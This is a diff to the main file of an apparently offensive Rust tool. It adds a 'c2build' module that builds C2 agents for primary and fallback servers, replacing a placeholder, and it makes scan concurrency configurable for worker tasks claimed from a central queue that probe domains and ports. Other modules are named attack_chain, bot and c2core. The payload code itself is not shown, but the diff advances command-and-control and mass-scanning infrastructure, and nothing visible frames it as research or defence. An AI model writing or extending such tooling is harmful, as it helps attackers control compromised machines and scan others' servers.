@@ -10,6 +10,7 @@ mod attack_chain;
 mod backup;
 mod bot;
 mod bot_connect;
+mod c2build;
 mod c2core;
 mod config;
 mod crawl;
@@ -1073,6 +1074,8 @@ async fn main() -> anyhow::Result<()> {
                                 let ports: Vec<u16> = task["params"]["ports"]
                                     .as_array().unwrap_or(&vec![])
                                     .iter().filter_map(|v| v.as_u64().map(|u| u as u16)).collect();
+                                let concurrency = task["params"]["concurrency"]
+                                    .as_u64().unwrap_or(5) as usize;
 
                                 log::info!("[Worker] Claimed task: {} ({} domains, {} ports)",
                                     task_id, domains.len(), ports.len());
@@ -1082,7 +1085,7 @@ async fn main() -> anyhow::Result<()> {
                                     .map(|d| discover::DomainPattern::parse(d))
                                     .collect::<Result<_, _>>()?;
 
-                                let servers = discover::discover(&patterns, &ports, 5).await;
+                                let servers = discover::discover(&patterns, &ports, concurrency).await;
 
                                 let discovered: Vec<serde_json::Value> = servers
                                     .iter()
@@ -1179,24 +1182,7 @@ async fn main() -> anyhow::Result<()> {
         }
 
         Some(Commands::C2Build { servers }) => {
-            use std::net::ToSocketAddrs;
-            println!("Building C2 agent for servers (ordered by priority):");
-            for (i, addr) in servers.iter().enumerate() {
-                let label = if i == 0 { "Primary" } else { "Fallback" };
-                match addr.to_socket_addrs() {
-                    Ok(_) => println!("  ✔ {}: {}", label, addr),
-                    Err(e) => {
-                        log::error!("Invalid server address '{}': {}", addr, e);
-                        eprintln!("  ✘ {}: {} (unresolvable)", label, addr);
-                        return Err(anyhow::anyhow!("Cannot resolve '{}'", addr));
-                    }
-                }
-            }
-            if servers.len() == 1 {
-                println!("  └─ (no fallback servers)");
-            }
-            // TODO: actual payload generation
-            log::warn!("Payload generation not yet implemented — this is a placeholder");
+            c2build::build_agent(&servers)?;
         }
 
         Some(Commands::McCrawl { targets, ports, concurrency, round_delay, port_delay_ms }) => {
